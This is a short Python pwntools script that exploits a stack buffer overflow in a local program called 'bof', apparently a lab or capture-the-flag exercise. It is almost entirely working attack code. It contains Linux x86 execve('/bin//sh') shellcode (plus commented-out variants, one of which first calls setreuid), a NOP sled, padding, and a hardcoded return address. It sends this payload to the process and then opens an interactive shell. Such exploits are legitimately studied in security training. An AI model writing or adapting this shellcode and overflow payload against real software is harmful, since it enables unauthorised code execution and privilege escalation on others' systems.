from pwn import *
import sys
from struct import pack

eip     = pack("<I",0xffffcfe4)
#shell1   = b"\x90\x90\x90\x90\x90\x29\xc0\x29\xdb\x29\xc9\x31\xd2\xb0\x46\xcd\x80\x31\xc0"
#shell1  += b"\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52"
#shell1  += b"\x54\x89\xe1\xb0\x0b\xcd\x80\xb0\x01\x30\xdb\xcd\x80"
#shell2   = b"\xcc\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"
shell   = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
shell  += b"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
ebp     = b"\x42"*4
nops    = b"\x90"*20
pad     = b"\x41"*(68-len(shell)-len(nops))
exploit = nops+shell+pad+ebp+eip
sys.stdout.buffer.write(exploit)
io = process('bof')
print(io.readline())
res = io.sendline(exploit)
print (res)
io.interactive()
